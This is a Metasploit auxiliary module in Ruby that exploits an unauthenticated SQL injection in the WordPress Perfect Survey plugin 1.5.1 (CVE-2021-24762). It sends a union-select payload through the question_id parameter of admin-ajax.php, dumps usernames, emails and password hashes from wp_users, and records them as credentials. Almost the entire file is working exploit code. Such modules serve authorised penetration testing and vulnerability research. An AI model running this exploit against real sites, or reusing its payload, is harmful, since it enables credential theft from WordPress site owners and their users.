##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  GET_SQLI_OBJECT_FAILED_ERROR_MSG = 'Unable to successfully retrieve an SQLi object'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Plugin Perfect Survey 1.5.1 SQLi (Unauthenticated)',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in the Perfect Survey
          plugin for WordPress (version 1.5.1). An unauthenticated attacker can
          exploit the SQLi to retrieve sensitive information such as usernames,
          emails, and password hashes from the `wp_users` table.
        },
        'Author' => [
          'Aaryan Golatkar', # Metasploit Module Creator
          'Ron Jost'         # Vulnerability discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['EDB', '50766'],
          ['CVE', '2021-24762']
        ],
        'DisclosureDate' => '2021-10-05',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to the WordPress installation', '/']),
      Opt::RPORT(80) # Default port for HTTP
    ])
  end

  # Define SQLi object
  def get_sqli_object
    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
      endpoint = normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php')
      sqli_payload = "1 union select 1,1,char(116,101,120,116),(#{payload}),0,0,0,null,null,null,null,null,null,null,null,null from wp_users"
      params = {
        'action' => 'get_question',
        'question_id' => sqli_payload
      }

      # Send HTTP GET request
      res = send_request_cgi({
        'uri' => endpoint,
        'method' => 'GET',
        'vars_get' => params
      })

      # Validate response
      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res
      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res.code == 200

      html_content = res.get_json_document['html']
      fail_with(Failure::Unknown, 'HTML content is empty') unless html_content

      # Extract data from response
      match_data = /survey_question_p">([^<]+)/.match(html_content)
      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless match_data

      extracted_data = match_data.captures[0]
      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless extracted_data

      extracted_data
    end
  end

  # Check method
  def check
    @sqli = get_sqli_object
    return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
    return Exploit::CheckCode::Vulnerable if @sqli.test_vulnerable

    Exploit::CheckCode::Safe
  end

  # Run method
  def run
    print_status('Exploiting SQLi in Perfect Survey plugin...')
    @sqli ||= get_sqli_object
    fail_with(Failure::UnexpectedReply, GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG

    creds_table = Rex::Text::Table.new(
      'Header' => 'WordPress User Credentials',
      'Indent' => 1,
      'Columns' => ['Username', 'Email', 'Hash']
    )

    print_status("Extracting credential information\n")
    users = @sqli.dump_table_fields('wp_users', %w[user_login user_email user_pass])
    users.each do |(username, email, hash)|
      creds_table << [username, email, hash]
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
        private_data: hash,
        service_name: 'WordPress Perfect Survey Plugin',
        address: datastore['RHOSTS'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED,
        email: email
      })
    end
    print_line creds_table.to_s
  end
end
